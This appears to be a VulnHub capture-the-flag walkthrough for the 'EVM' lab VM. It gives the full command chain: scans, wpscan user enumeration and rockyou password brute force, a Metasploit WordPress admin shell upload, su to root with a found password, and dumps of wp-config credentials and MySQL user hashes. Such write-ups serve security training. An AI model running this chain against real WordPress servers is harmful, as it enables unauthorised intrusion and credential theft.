---
title: "EVM"
date: 2021-05-04T10:36:01+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - WordPress
  - MySQL
---

## EVM VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24` 
- Toppo - `10.0.2.5` 

#### RustScan + Nmap

- `sudo rustscan -a 10.0.2.5 -- -sS -A` 

```
10.0.2.5:22  => OpenSSH 7.2p2 
10.0.2.5:53  => domain 
10.0.2.5:80  => Apache httpd 2.4.18 
10.0.2.5:110 => Dovecot pop3d 
10.0.2.5:139 => Samba smbd 3.X - 4.X 
10.0.2.5:143 => Dovecot imapd 
10.0.2.5:445 => Samba smbd 4.3.11-Ubuntu 
```

- ```
  nmap --script smb-enum-* -p 139,445 10.0.2.5
  ```

#### GoBuster

- ```
  gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.5 -t 60 -x txt
  ```

```
/wordpress            (Status: 301) [Size: 308] [--> http://10.0.2.5/wordpress/]
/server-status        (Status: 403) [Size: 296]
```
- If you check the default Apache page at `http://10.0.2.5`, it says: `you can find me at /wordpress/ im vulnerable webapp :)` 

---

### Exploitation

- ```
  wpscan --url http://10.0.2.5/wordpress -e at -e ap -e u
  ```

```
-e = enumerate 
at = all themes
ap = all plugins
u = user IDs
```

```
c0rrupt3d_brain 
Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
Confirmed By: Login Error Messages (Aggressive Detection) 
``` 

- ```
  wpscan --url http://10.0.2.5/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt -t 60
  ```

```
Valid Combinations Found:
Username: c0rrupt3d_brain, Password: 24992499
```

- For next step, we need Metasploit: `msfconsole` 
- `search wordpress admin` 
- ```
  use exploit/unix/webapp/wp_admin_shell_upload
  ```

- `options`
- `set RHOSTS 10.0.2.5`
- `set USERNAME c0rrupt3d_brain`
- `set PASSWORD 24992499`
- `set TARGETURI /wordpress` 
- `run` 
- Type `shell` in the meterpreter shell that appears after the exploitation is complete. Then run python code to spawn a bash shell. 

![EVM WordPress Metasploit Exploitation](/imgs/evm/EVM_wordpress_metasploit_exploitation.png)

- `python3 -c 'import pty;pty.spawn("/bin/bash")'` 
- `whoami` => `www-data` 
- `cd /home && ls -la` 
- `cd root3r && ls -la` 
- `cat test.txt` => `123` - nothing useful (this actually turned out to be database password).
- `cat .root_password_ssh.txt` => `willy26` 

---

### Privilege Escalation

- `su root`: `willy26` 
- `whoami` => `root` 
- `cd /root && ls -la` 

![EVM Root Proof](/imgs/evm/EVM_root_proof.png)

- `cat proof.txt` 
```
voila you have successfully pwned me :) !!!
:D
```

---

### Post Exploitation

#### WordPress Configuration Files

- `cd /var/www/html && ls -la` shows `wp-config.php` file. 
- `cat wp-config.php` 
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'hackme_wp' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', '123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
- We get hard coded credentials to the database from the config file `wp-config.php`: 
```
DB_NAME = hackme_wp
DB_USER = root
DB_PASSWORD = 123
```
- MySQL database is usually stored in `/var/lib/mysql/`. 

#### MySQL Database Data Extraction

- [Basic MySQL Commands](https://book.hacktricks.xyz/pentesting/pentesting-mysql#basic-and-interesting-mysql-commands)

- `mysql -u root -p` => `123` 
- `show databases;`
```sql
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| vulnwp             |
+--------------------+
```
- `use mysql;` 
- `SELECT user FROM user;` 
```sql
SELECT user FROM user;
+------------------+
| user             |
+------------------+
| debian-sys-maint |
| mysql.session    |
| mysql.sys        |
| root             |
+------------------+
```
- `use vulnwp;`
- `show tables;` 
- `SELECT * FROM wp_posts;` will list all the posts from database. 
- `SELECT * FROM wp_users;` 
```sql
SELECT * FROM wp_users;
+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+
| ID | user_login      | user_pass                          | user_nicename   | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name    |
+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+
|  1 | c0rrupt3d_brain | $P$BeIRcDvfjdzumCYjeRfShVUMy8BkXf/ | c0rrupt3d_brain | vuln@localhost.ws |          | 2019-10-31 21:47:00 |                     |           0 | c0rrupt3d_brain |
+----+-----------------+------------------------------------+-----------------+-------------------+----------+---------------------+---------------------+-------------+-----------------+
```
- `SELECT * FROM wp_comments;` to see all the comments. 
- We can try other tables and databases but since we already have root access and all the credentials, this much should be more than enough. 

